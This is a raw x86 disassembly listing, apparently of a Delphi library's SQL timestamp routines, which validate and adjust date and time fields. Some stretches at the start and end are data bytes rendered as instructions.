adc al [ eax ]
insb
jns r-xdata
push esp
imul ebp [ ebp + 0x53 ] 0xdc000974
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
je r-xdata
shl [ edi + eax * 2 ] 0x1
pop es
adc [ ebx + edx * 2 + 0x51 ] edx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jo r-xdata
lea eax [ eax ]
lodsb [ esi ]
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ecx
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
je r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
push ebx
push ecx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004774 ] bh
sub_4773a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
je r-xdata
inc edi
add [ eax + 0x5c ] bh
inc ecx
add [ eax + 0x7b ] cl
inc edi
add [ ebp + edi * 2 + 0x7dfc0047 ] ch
inc edi
add [ eax + 0x60 ] bl
inc ecx
add [ eax + 0x5c ] al
inc ecx
add [ eax ] dh
jle r-xdata
add [ eax + eax ] dl
add [ eax ] al
test [ ebx + 0x41 ] ch
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2bffbea1 ] al
pushad
inc ecx
add [ eax ] dl
pushad
inc ecx
add [ eax + 0x41 ] al
add [ eax ] ah
inc ecx
add [ eax ] dh
inc ecx
add [ eax ] cl
inc ecx
add [ eax + 0x7b ] bl
inc edi
add [ esp + edi * 2 + 0x5c780047 ] al
inc edi
add [ ecx ] bl
inc ecx
add ah dh
inc cx
add [ eax ] al
inc ecx
add [ eax ] dh
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
popad
je r-xdata
add [ eax ] al
add ah ch
pop [ ecx ]
fdiv [ 0x35e40040 ]
add [ eax ] al
add [ eax ] al
mov eax 0x14004774
add [ eax - 0x7ffbe8d ] ah
jge r-xdata
add eax [ ecx + 0x79 ]
xchg esp eax
popad
je r-xdata
add [ eax ] al
mov eax eax
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ esp + edi * 4 ] ah
inc ecx
add al bl
xor eax 0x35e40040
add [ eax ] bl
push esp
push ebx
push ecx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jo r-xdata
dec ebp
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x40108073
add [ edx ] cl
add [ eax ] al
jmp [ eax ]
push esp
imul ebp [ ebp + 0x65 ] r-xdata
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x694d0600
outsb
jne r-xdata
imul ebp [ esi + 0x67 ] r-xdata
add [ ecx + edi * 2 + 0x10047 ] al
popad
je r-xdata
inc ecx
add [ ecx ] dl
push esp
mov esp 0xbd340041
popad
jb r-xdata
add [ ebp + 0x6 ] dh
adc [ eax ] 0x40
add [ esi ] cl
add [ eax ] al
add [ ecx ] al
adc [ eax ] al
or al [ eax ]
add bh bh
and [ ebx + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040004 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46090003 ] al
jb r-xdata
add [ ebp + 0x1b ] dh
adc [ gs : eax ] 0x40
insd
push ebx
je r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
sbb al 0x7b
inc edi
add [ ecx ] al
or [ eax ] al
lodsb [ esi ]
je r-xdata
insd
push ebx
je r-xdata
popad
outsb
je r-xdata
mov al 0x1
retn
xor eax eax
retn
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
add al 0x59
add [ esi ] al
add [ eax ] al
push [ eax ]
jpo r-xdata
adc [ eax ] 0x40
add [ eax + eax ] cl
add bh bh
sub [ ebx + 0x47 ] bh
add [ ecx ] al
cmp [ eax + 0x8 ] 0x0
jne r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x59040008 ] al
outsd
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d050006 ] al
test al 0x79
inc edi
add ah bl
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
or [ ecx + 0x73 ] al
push ebx
add [ eax - 0x70 ] ah
inc ecx
add [ ecx ] cl
add [ eax ] cl
push ebx
jno r-xdata
test [ ecx + 0x47 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080001 ] al
jae r-xdata
jo r-xdata
insd
inc ecx
add [ edi * 4 - 0x43afffbf ] bh
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060005 ] al
imul ebp [ esi + 0x75 ] 0x10806574
inc eax
shl [ esi - 0x7d ] 0x38
add [ ebp + 0x29 ] dh
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
add bh bh
adc al 0x7b
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44030002 ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1004779 ] ch
jns r-xdata
adc al [ eax ]
insb
jns r-xdata
push esp
imul ebp [ ebp + 0x53 ] 0xdc000974
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
je r-xdata
shl [ edi + eax * 2 ] 0x1
pop es
adc [ ebx + edx * 2 + 0x51 ] edx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jo r-xdata
lea eax [ eax ]
lodsb [ esi ]
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ecx
add [ edi * 4 - 0x42c3ffbf ] dh
inc ecx
add [ eax - 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
je r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
push ebx
push ecx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004774 ] bh
sub_477624
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_477668
push ebx
jmp r-xdata
mov cx [ eax + 0x6 ]
cmp cx 0x1
jb r-xdata
xor ecx ecx
mov cl dl
mov bx [ ecx * 4 + rw-data ]
add [ eax + 0x4 ] bx
mov cx [ ecx * 4 + rw-data ]
add [ eax + 0x6 ] cx
cmp cx 0xc
ja r-xdata
pop ebx
retn
sub_47769c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_477828
jmp r-xdata
mov dx [ esi + 0x8 ]
cmp dx 0x1
jb r-xdata
xor edx edx
mov dl bl
mov dx [ edx * 4 + rw-data ]
add [ esi + 0x6 ] dx
test bl bl
je r-xdata
movzx edx dx
cmp eax edx
jl r-xdata
add [ esi + 0x8 ] ax
sub [ esi + 0x8 ] ax
jmp r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_477668
mov eax esi
call sub_477828
sub_4776f0
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xa ]
cmp ax 0x17
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0x8 ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xa ] ax
mov edx ebx
mov eax esi
call sub_47769c
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_477734
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xc ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xa ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xc ] ax
mov edx ebx
mov eax esi
call sub_4776f0
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_477778
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xe ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xc ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xe ] ax
mov edx ebx
mov eax esi
call sub_477734
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_4777bc
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_477668
mov edx ebx
mov eax esi
call sub_47769c
mov edx ebx
mov eax esi
call sub_4776f0
mov edx ebx
mov eax esi
call sub_477734
mov edx ebx
mov eax esi
call sub_477778
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_477778
mov edx ebx
mov eax esi
call sub_477734
mov edx ebx
mov eax esi
call sub_4776f0
mov edx ebx
mov eax esi
call sub_47769c
mov edx ebx
mov eax esi
call sub_477668
pop esi
pop ebx
retn
sub_477840
mov cx [ edx + 0x4 ]
sub [ eax + 0x4 ] cx
mov cx [ edx + 0x6 ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0x8 ]
sub [ eax + 0x8 ] cx
mov cx [ edx + 0xa ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0xc ]
sub [ eax + 0xc ] cx
mov cx [ edx + 0xe ]
sub [ eax + 0xe ] cx
mov edx [ edx + 0x10 ]
sub [ eax + 0x10 ] edx
mov dl 0x1
call sub_4777bc
retn
sub_477880
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47765c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov ax [ esi + 0x4 ]
add [ ebx + 0x4 ] ax
mov ax [ esi + 0x6 ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0x8 ]
add [ ebx + 0x8 ] ax
mov ax [ esi + 0xa ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0xc ]
add [ ebx + 0xc ] ax
mov ax [ esi + 0xe ]
add [ ebx + 0xe ] ax
mov eax [ esi + 0x10 ]
add [ ebx + 0x10 ] eax
xor edx edx
mov eax ebx
call sub_4777bc
sub_4778d4
push ebx
movsx ecx [ eax + 0x4 ]
movsx ebx [ edx + 0x4 ]
sub ecx ebx
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x6 ]
movzx ebx [ edx + 0x6 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x8 ]
movzx ebx [ edx + 0x8 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xc ]
movzx ebx [ edx + 0xc ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xe ]
movzx ebx [ edx + 0xe ]
sub ecx ebx
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x10 ]
sub ecx [ edx + 0x10 ]
test ecx ecx
jle r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
mov al 0x2
jmp r-xdata
pop ebx
retn
sub_477984
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_477f18
mov esi esp
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4779a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_477f84
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4779d4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_477f84
push esi
lea edi [ esi + 0x4 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_477a30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_477f18
xor edx edx
mov eax edi
call sub_403360
push edi
add edi 0x4
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_477a88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
call sub_478054
xor edx edx
mov eax edi
call sub_403360
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x10
call sub_4029b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_477ad8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_477a88
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_477b58
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477c78
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416060
xor eax eax
push ebp
push sub_477c5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416070
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4160fc
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_416060
xor eax eax
push ebp
push sub_477c2e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41607c
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4779d4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_416068
retn
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416108
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477a30
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c62
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_416068
retn
sub_477c84
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_477d9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415bec
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_477954
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_404978
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4160b0
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477da2
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x18 ]
call sub_40482c
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_477954
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4160a4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_416060
xor eax eax
push ebp
push sub_477d64
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x7
mov eax [ ebx + 0x8 ]
call sub_47796c
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41607c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_416068
retn
sub_477dac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_477ad8
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_416090
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_416070
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_477dfc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_477880
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_477840
jmp r-xdata
jmp r-xdata
call sub_416034
sub_477e30
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4778d4
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_477e50
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
lea eax [ esp + 0x8 ]
call sub_477fcc
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax esi
mov edx ebx
call sub_40aad4
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_477e8c
push ebx
push esi
mov ebx eax
mov si [ ebx + 0x2 ]
cmp si 0xc
ja r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov ax [ ebx ]
call sub_4772dc
cmp ax [ ebx + 0x4 ]
jb r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
cmp [ ebx + 0x8 ] 0x3b
ja r-xdata
cmp [ ebx + 0xa ] 0x3b
jbe r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_477ecc
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edx esp
call sub_40b3a4
test al al
je r-xdata
test al al
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
call sub_477f84
lea esi [ esp + 0x8 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_477e8c
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_477f18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477f75
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_477ecc
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477f7c
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
sub_477f84
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x2 ]
lea eax [ ebp - 0x4 ]
call sub_409f00
mov ax [ ebp - 0x4 ]
mov [ ebx ] ax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
lea ecx [ ebx + 0xa ]
lea edx [ ebx + 0x8 ]
lea eax [ ebx + 0x6 ]
call sub_409c24
movzx eax [ ebp - 0x2 ]
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_477fcc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_477624
test al al
je r-xdata
mov cx [ ebx + 0x4 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409d84
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409be4
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409be4
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_478054
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_478150
push [ fs : eax ]
mov [ fs : eax ] esp
movsx eax [ ebx ]
movzx edx [ ebx + 0x2 ]
add eax edx
movzx edx [ ebx + 0x4 ]
add eax edx
mov edx eax
movzx ecx [ ebx + 0x6 ]
add edx ecx
movzx ecx [ ebx + 0x8 ]
add edx ecx
movzx ecx [ ebx + 0xa ]
add edx ecx
test edx edx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478157
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
test eax eax
jle r-xdata
movzx eax [ ebx + 0x6 ]
movzx edx [ ebx + 0x8 ]
add eax edx
movzx edx [ ebx + 0xa ]
add eax edx
test eax eax
jbe r-xdata
mov si [ ebx ]
test si si
je r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
cmp [ ebx + 0x2 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
cmp [ ebx + 0xa ] 0x3b
ja r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x3b
jbe r-xdata
cmp [ ebx + 0x2 ] 0x1f
ja r-xdata
mov dx [ ebx + 0x2 ]
mov eax esi
call sub_4772dc
cmp ax [ ebx + 0x4 ]
jae r-xdata
sub_478160
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_478191
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478198
retn
mov eax rw-data
call sub_40d7a0
sub_4781bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x82
inc edi
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7e ] ah
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xd8004781
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x15004033 ] al
inc ebp
inc edx
arpl [ edi + ecx * 2 + 0x76 ] sp
jb r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xd004033 ] al
inc ebp
inc edx
arpl [ ebp + eax * 2 + 0x78 ] sp
arpl [ ebp + 0x70 ] sp
je r-xdata
and al 0x60
insb
outsd
ja r-xdata
inc ecx
add [ edi ] 0x0
outsd
outsb
mov eax eax
pushad
add [ edi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] al
add [ eax - 0x7ffbe8d ] ah
mov [ edi ] es
adc dl [ esi + eax * 2 + 0x4d ]
push esp
inc edx
arpl [ esi + edx * 2 + 0x61 ] sp
jb r-xdata
inc ecx
add [ eax ] dl
pushad
inc ecx
add [ eax + 0x41 ] al
add [ eax ] ah
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2bffbea1 ] al
pushad
js r-xdata
add [ eax ] eax
or [ ecx + 0x73 ] al
inc esp
outsd
jne r-xdata
xchg esp eax
add [ edi ] 0x7
or edx [ esi + eax * 2 + 0x4d ]
push esp
je r-xdata
popad
popad
outsb
add [ eax ] dh
inc ecx
add [ eax ] cl
inc ecx
add ah dh
mov [ edi ] eax
sub al 0x8b
inc edi
add [ eax + 0x5c ] bh
inc ecx
jo r-xdata
add [ eax + eax ] 0x8
inc ecx
jae r-xdata
insb
push esp
adc [ eax ] al
dec esp
xchg [ edi ] al
push esp
xchg [ edi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
